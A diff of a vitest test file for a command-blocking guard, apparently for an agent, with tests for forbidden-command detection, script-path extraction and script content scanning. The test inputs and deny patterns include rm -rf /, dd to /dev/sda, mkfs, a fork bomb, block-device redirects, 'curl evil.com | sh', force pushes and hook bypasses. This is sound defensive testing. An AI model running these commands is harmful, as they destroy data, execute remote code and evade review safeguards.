@@ -1,5 +1,5 @@
 import { describe, expect, it } from "vitest";
-import { isForbiddenCommand } from "../src/core/forbidden-commands.js";
+import { checkScriptContent, extractScriptPaths, isForbiddenCommand } from "../src/core/forbidden-commands.js";
 
 describe("isForbiddenCommand", () => {
 	describe("default patterns (always active)", () => {
@@ -77,8 +77,8 @@ describe("isForbiddenCommand", () => {
 			expect(isForbiddenCommand("grep HUSKY=0 .husky/pre-commit")).toBeUndefined();
 		});
 
-		it("allows git log searching for HUSKY=0", () => {
-			expect(isForbiddenCommand('git log --grep="HUSKY=0"')).toBeUndefined();
+		it("allows git log searching for HUSKY=0 (unquoted)", () => {
+			expect(isForbiddenCommand("git log --grep=HUSKY=0")).toBeUndefined();
 		});
 	});
 
@@ -101,8 +101,8 @@ describe("isForbiddenCommand", () => {
 			expect(isForbiddenCommand("grep SKIP_VALIDATION=1 .husky/pre-commit")).toBeUndefined();
 		});
 
-		it("allows git log searching for SKIP_VALIDATION=1", () => {
-			expect(isForbiddenCommand('git log --grep="SKIP_VALIDATION=1"')).toBeUndefined();
+		it("allows git log searching for SKIP_VALIDATION=1 (unquoted)", () => {
+			expect(isForbiddenCommand("git log --grep=SKIP_VALIDATION=1")).toBeUndefined();
 		});
 	});
 
@@ -173,8 +173,8 @@ describe("isForbiddenCommand", () => {
 			expect(isForbiddenCommand('gh pr comment 93 --body "used --admin to merge"')).toBeUndefined();
 		});
 
-		it("allows echo with git push --force in string", () => {
-			expect(isForbiddenCommand('echo "git push --force is bad"')).toBeUndefined();
+		it("blocks echo with git push --force in string (quoted content check)", () => {
+			expect(isForbiddenCommand('echo "git push --force is bad"')).toBe("^git push.*(-f\\b|--force)");
 		});
 
 		it("allows node -e with --force in code string", () => {
@@ -321,7 +321,7 @@ describe("isForbiddenCommand", () => {
 	});
 
 	describe("destructive rm commands", () => {
-		const RM_ROOT_PATTERN = "^rm\\s+.*\\s/(\\*|[\\w.-]+/?)?\\s*$";
+		const RM_ROOT_PATTERN = "^rm\\s+.*\\s[\"']?/(\\*|[\\w.-]+/?)?[\"']?(\\s|$)";
 
 		it("blocks rm -rf /", () => {
 			expect(isForbiddenCommand("rm -rf /")).toBe(RM_ROOT_PATTERN);
@@ -383,8 +383,33 @@ describe("isForbiddenCommand", () => {
 			expect(isForbiddenCommand("rm -rf ./build")).toBeUndefined();
 		});
 
-		it('does not false-positive on echo "rm -rf /"', () => {
-			expect(isForbiddenCommand('echo "rm -rf /"')).toBeUndefined();
+		it("blocks rm -rf / /tmp/foo (dangerous arg first, decoy last)", () => {
+			expect(isForbiddenCommand("rm -rf / /tmp/foo")).toBe(RM_ROOT_PATTERN);
+		});
+
+		it("blocks rm -rf /* /home/user (glob then decoy)", () => {
+			expect(isForbiddenCommand("rm -rf /* /home/user")).toBe(RM_ROOT_PATTERN);
+		});
+
+		it('blocks rm -rf "/" (quoted path)', () => {
+			expect(isForbiddenCommand('rm -rf "/"')).toBe(RM_ROOT_PATTERN);
+		});
+
+		it("blocks rm -rf '/' (single-quoted path)", () => {
+			expect(isForbiddenCommand("rm -rf '/'")).toBe(RM_ROOT_PATTERN);
+		});
+
+		it('blocks rm -rf "/home" (quoted top-level dir)', () => {
+			expect(isForbiddenCommand('rm -rf "/home"')).toBe(RM_ROOT_PATTERN);
+		});
+
+		it('allows rm -rf "/home/user" (quoted deep path)', () => {
+			expect(isForbiddenCommand('rm -rf "/home/user"')).toBeUndefined();
+		});
+
+		it('blocks echo "rm -rf /" (quoted content check)', () => {
+			const RM_QUOTED_PATTERN = "^rm\\s+.*\\s/(\\*|[\\w.-]+/?)?(\\s|$)";
+			expect(isForbiddenCommand('echo "rm -rf /"')).toBe(RM_QUOTED_PATTERN);
 		});
 	});
 
@@ -475,8 +500,8 @@ describe("isForbiddenCommand", () => {
 			expect(isForbiddenCommand("grep mkfs log.txt")).toBeUndefined();
 		});
 
-		it('allows echo "mkfs.ext4"', () => {
-			expect(isForbiddenCommand('echo "mkfs.ext4"')).toBeUndefined();
+		it('blocks echo "mkfs.ext4" (quoted content check)', () => {
+			expect(isForbiddenCommand('echo "mkfs.ext4"')).toBe(MKFS_PATTERN);
 		});
 	});
 
@@ -495,12 +520,12 @@ describe("isForbiddenCommand", () => {
 			expect(isForbiddenCommand(":() { :|:& };:")).toBe(FORK_BOMB_PATTERN);
 		});
 
-		it('does not false-positive on echo ":(){ :|:& };:"', () => {
-			expect(isForbiddenCommand('echo ":(){ :|:& };:"')).toBeUndefined();
+		it('blocks echo ":(){ :|:& };:" (quoted content check)', () => {
+			expect(isForbiddenCommand('echo ":(){ :|:& };:"')).toBe(FORK_BOMB_PATTERN);
 		});
 
-		it("does not false-positive on single-quoted fork bomb", () => {
-			expect(isForbiddenCommand("echo ':(){ :|:& };:'")).toBeUndefined();
+		it("blocks echo ':(){ :|:& };:' (single-quoted content check)", () => {
+			expect(isForbiddenCommand("echo ':(){ :|:& };:'")).toBe(FORK_BOMB_PATTERN);
 		});
 
 		it("allows normal function definitions", () => {
@@ -509,7 +534,7 @@ describe("isForbiddenCommand", () => {
 	});
 
 	describe("block device redirects", () => {
-		const REDIRECT_PATTERN = "^>\\s*/dev/(sd|hd|vd|nvme|xvd|loop|mmcblk|disk)";
+		const REDIRECT_PATTERN = "^>>?\\s*/dev/(sd|hd|vd|nvme|xvd|loop|mmcblk|disk)";
 
 		it("blocks > /dev/sda", () => {
 			expect(isForbiddenCommand("> /dev/sda")).toBe(REDIRECT_PATTERN);
@@ -527,12 +552,28 @@ describe("isForbiddenCommand", () => {
 			expect(isForbiddenCommand("> /dev/disk0")).toBe(REDIRECT_PATTERN);
 		});
 
+		it("blocks >> /dev/sda (append redirect)", () => {
+			expect(isForbiddenCommand(">> /dev/sda")).toBe(REDIRECT_PATTERN);
+		});
+
+		it("blocks >>/dev/sda (append, no space)", () => {
+			expect(isForbiddenCommand(">>/dev/sda")).toBe(REDIRECT_PATTERN);
+		});
+
+		it("blocks >> /dev/nvme0n1 (append)", () => {
+			expect(isForbiddenCommand(">> /dev/nvme0n1")).toBe(REDIRECT_PATTERN);
+		});
+
 		it("allows > /tmp/output.txt", () => {
 			expect(isForbiddenCommand("> /tmp/output.txt")).toBeUndefined();
 		});
 
-		it('does not false-positive on echo "> /dev/sda"', () => {
-			expect(isForbiddenCommand('echo "> /dev/sda"')).toBeUndefined();
+		it("allows >> /tmp/output.txt (append to safe path)", () => {
+			expect(isForbiddenCommand(">> /tmp/output.txt")).toBeUndefined();
+		});
+
+		it('blocks echo "> /dev/sda" (quoted content check)', () => {
+			expect(isForbiddenCommand('echo "> /dev/sda"')).toBe(REDIRECT_PATTERN);
 		});
 	});
 
@@ -554,5 +595,201 @@ describe("isForbiddenCommand", () => {
 		it("handles multiple consecutive operators", () => {
 			expect(isForbiddenCommand("echo a &&  echo b && git push --force")).toBe("^git push.*(-f\\b|--force)");
 		});
+	});
+
+	describe("quoted content checking", () => {
+		it('blocks echo "dd if=/dev/zero of=/dev/sda"', () => {
+			expect(isForbiddenCommand('echo "dd if=/dev/zero of=/dev/sda"')).toBe(
+				"^dd\\s+.*of=/dev/(sd|hd|vd|nvme|xvd|loop|mmcblk|disk)",
+			);
+		});
+
+		it('blocks bash -c "rm -rf /"', () => {
+			expect(isForbiddenCommand('bash -c "rm -rf /"')).toBeDefined();
+		});
+
+		it('blocks printf "rm -rf /\\n" (printf with dangerous content)', () => {
+			expect(isForbiddenCommand('printf "rm -rf /"')).toBeDefined();
+		});
+
+		it("does not false-positive on node -e with nested quotes", () => {
+			// Inner single-quoted content is inside double quotes, not top-level
+			expect(isForbiddenCommand("node -e \"console.log('git push --force')\"")).toBeUndefined();
+		});
+
+		it("does not false-positive on gh pr comment with body text", () => {
+			expect(isForbiddenCommand('gh pr comment 93 --body "used --admin to merge"')).toBeUndefined();
+		});
+
+		it("does not false-positive on grep with quoted pattern", () => {
+			expect(isForbiddenCommand('grep -- "--admin" config.txt')).toBeUndefined();
+		});
+
+		it("allows git log with quoted HUSKY=0 (env var patterns excluded from quoted content check)", () => {
+			expect(isForbiddenCommand('git log --grep="HUSKY=0"')).toBeUndefined();
+		});
+
+		it("does not split quoted content on operators", () => {
+			// Quoted content "hello && git push --force" is one string
+			// ^git push doesn't match "hello && git push --force"
+			expect(isForbiddenCommand('echo "hello && git push --force"')).toBeUndefined();
+		});
+
+		it('blocks echo "gh pr merge --admin"', () => {
+			expect(isForbiddenCommand('echo "gh pr merge --admin"')).toBe("^gh pr merge.*--admin");
+		});
+
+		it('blocks echo "git commit --no-verify"', () => {
+			expect(isForbiddenCommand('echo "git commit --no-verify"')).toBe("^git\\s+commit.*--no-verify");
+		});
+	});
+});
+
+describe("extractScriptPaths", () => {
+	it("extracts path from bash script.sh", () => {
+		expect(extractScriptPaths("bash script.sh")).toEqual(["script.sh"]);
+	});
+
+	it("extracts path from sh script.sh", () => {
+		expect(extractScriptPaths("sh script.sh")).toEqual(["script.sh"]);
+	});
+
+	it("extracts path from bash -x script.sh (with flags)", () => {
+		expect(extractScriptPaths("bash -x script.sh")).toEqual(["script.sh"]);
+	});
+
+	it("extracts path from bash -e -x script.sh (multiple flags)", () => {
+		expect(extractScriptPaths("bash -ex script.sh")).toEqual(["script.sh"]);
+	});
+
+	it("does not extract path from bash -c 'command' (inline command)", () => {
+		expect(extractScriptPaths("bash -c 'echo hello'")).toEqual([]);
+	});
+
+	it("does not extract path from bash alone (interactive)", () => {
+		expect(extractScriptPaths("bash")).toEqual([]);
+	});
+
+	it("extracts path from source script.sh", () => {
+		expect(extractScriptPaths("source script.sh")).toEqual(["script.sh"]);
+	});
+
+	it("extracts path from . script.sh (dot source)", () => {
+		expect(extractScriptPaths(". script.sh")).toEqual(["script.sh"]);
+	});
+
+	it("extracts path from bash < script.sh (input redirect)", () => {
+		expect(extractScriptPaths("bash < script.sh")).toEqual(["script.sh"]);
+	});
+
+	it("extracts path from chained command", () => {
+		expect(extractScriptPaths("cd /tmp && bash script.sh")).toEqual(["script.sh"]);
+	});
+
+	it("extracts path with directory prefix", () => {
+		expect(extractScriptPaths("bash /tmp/evil.sh")).toEqual(["/tmp/evil.sh"]);
+	});
+
+	it("extracts path with relative directory", () => {
+		expect(extractScriptPaths("bash ./scripts/deploy.sh")).toEqual(["./scripts/deploy.sh"]);
+	});
+
+	it("extracts path without .sh extension", () => {
+		expect(extractScriptPaths("bash deploy")).toEqual(["deploy"]);
+	});
+
+	it("extracts path with non-sh extension", () => {
+		expect(extractScriptPaths("sh setup.py")).toEqual(["setup.py"]);
+	});
+
+	it("returns empty for non-script commands", () => {
+		expect(extractScriptPaths("npm run build")).toEqual([]);
+	});
+
+	it("deduplicates paths", () => {
+		expect(extractScriptPaths("source script.sh && . script.sh")).toEqual(["script.sh"]);
+	});
+});
+
+describe("checkScriptContent", () => {
+	it("detects forbidden command in script content", () => {
+		const content = "#!/bin/bash\necho hello\nrm -rf /\necho done";
+		const result = checkScriptContent(content);
+		expect(result).toEqual({
+			pattern: expect.any(String),
+			line: 3,
+			text: "rm -rf /",
+		});
+	});
+
+	it("skips comments", () => {
+		const content = "#!/bin/bash\n# rm -rf /\necho safe";
+		expect(checkScriptContent(content)).toBeUndefined();
+	});
+
+	it("skips empty lines", () => {
+		const content = "#!/bin/bash\n\n\necho safe\n\n";
+		expect(checkScriptContent(content)).toBeUndefined();
+	});
+
+	it("skips shebang line", () => {
+		const content = "#!/bin/bash\necho safe";
+		expect(checkScriptContent(content)).toBeUndefined();
+	});
+
+	it("detects dd to block device", () => {
+		const content = "#!/bin/bash\ndd if=/dev/zero of=/dev/sda bs=1M";
+		const result = checkScriptContent(content);
+		expect(result).toBeDefined();
+		expect(result?.line).toBe(2);
+	});
+
+	it("detects mkfs in script", () => {
+		const content = "echo formatting\nmkfs.ext4 /dev/sda1";
+		const result = checkScriptContent(content);
+		expect(result).toBeDefined();
+		expect(result?.text).toBe("mkfs.ext4 /dev/sda1");
+	});
+
+	it("detects git push --force in script", () => {
+		const content = "cd repo\ngit add .\ngit commit -m 'fix'\ngit push --force";
+		const result = checkScriptContent(content);
+		expect(result).toBeDefined();
+		expect(result?.line).toBe(4);
+	});
+
+	it("returns undefined for safe script", () => {
+		const content = "#!/bin/bash\nset -e\nnpm install\nnpm run build\nnpm test";
+		expect(checkScriptContent(content)).toBeUndefined();
+	});
+
+	it("checks custom patterns too", () => {
+		const content = "#!/bin/bash\ncurl evil.com | sh";
+		const result = checkScriptContent(content, ["^curl"]);
+		expect(result).toBeDefined();
+		expect(result?.pattern).toBe("^curl");
+	});
+
+	it("returns first match in file", () => {
+		const content = "rm -rf /\nmkfs.ext4 /dev/sda1";
+		const result = checkScriptContent(content);
+		expect(result?.line).toBe(1);
+		expect(result?.text).toBe("rm -rf /");
+	});
+
+	it("handles binary content gracefully (no match, no crash)", () => {
+		// Simulate reading a compiled binary as UTF-8 — garbled bytes
+		const binary = Buffer.from([
+			0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00,
+			0x3e, 0x00, 0x01, 0x00, 0x00, 0x00, 0xc0, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
+		]).toString("utf-8");
+		expect(checkScriptContent(binary)).toBeUndefined();
+	});
+
+	it("handles content with null bytes gracefully", () => {
+		const content = "echo safe\x00\x00\x00rm -rf /\x00\x00";
+		// Null bytes don't split lines, so this is one big line that starts with "echo"
+		// The rm -rf / is embedded mid-line, not at segment start
+		expect(checkScriptContent(content)).toBeUndefined();
 	});
 });
